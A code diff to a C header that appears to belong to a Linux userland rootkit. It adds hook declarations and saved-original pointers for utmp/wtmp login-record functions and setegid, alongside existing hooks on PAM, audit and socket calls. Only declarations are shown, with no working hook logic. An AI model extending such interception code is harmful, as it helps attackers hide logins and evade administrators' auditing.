@@ -123,7 +123,14 @@ int audit_send(int fd, int type, const void *data, unsigned int size);
 // symbols/utmp/*
 struct utmp *getutent(void);
 struct utmpx *getutxent(void);
+struct utmp *getutid(const struct utmp *ut);
+struct utmpx *getutxid(const struct utmpx *utx);
 struct utmp *pututline(const struct utmp *ut);
+struct utmpx *pututxline(const struct utmpx *utx);
+void getutmp(const struct utmpx *utx, struct utmp *ut);
+void getutmpx(const struct utmp *ut, struct utmpx *utx);
+void updwtmp(const char *wfile, const struct utmp *ut);
+void updwtmpx(const char *wfilex, const struct utmpx *utx);
 void login(const struct utmp *ut);
 
 // symbols/hiding/socket.c
@@ -142,6 +149,7 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags);
 
 // symbols/gid/*
 int setgid(gid_t gid);
+int setegid(gid_t egid);
 int setregid(gid_t rgid, gid_t egid);
 int setresgid(gid_t rgid, gid_t egid, gid_t sgid);
 
@@ -266,7 +274,14 @@ typeof(audit_send) *old_audit_send;
 
 typeof(getutent) *old_getutent;
 typeof(getutxent) *old_getutxent;
+typeof(getutid) *old_getutid;
+typeof(getutxid) *old_getutxid;
 typeof(pututline) *old_pututline;
+typeof(pututxline) *old_pututxline;
+typeof(getutmp) *old_getutmp;
+typeof(getutmpx) *old_getutmpx;
+typeof(updwtmp) *old_updwtmp;
+typeof(updwtmpx) *old_updwtmpx;
 typeof(login) *old_login;
 
 typeof(socket) *old_socket;
@@ -281,6 +296,7 @@ typeof(pam_open_session) *old_pam_open_session;
 typeof(pam_acct_mgmt) *old_pam_acct_mgmt;
 
 typeof(setgid) *old_setgid;
+typeof(setegid) *old_setegid;
 typeof(setregid) *old_setregid;
 typeof(setresgid) *old_setresgid;
 
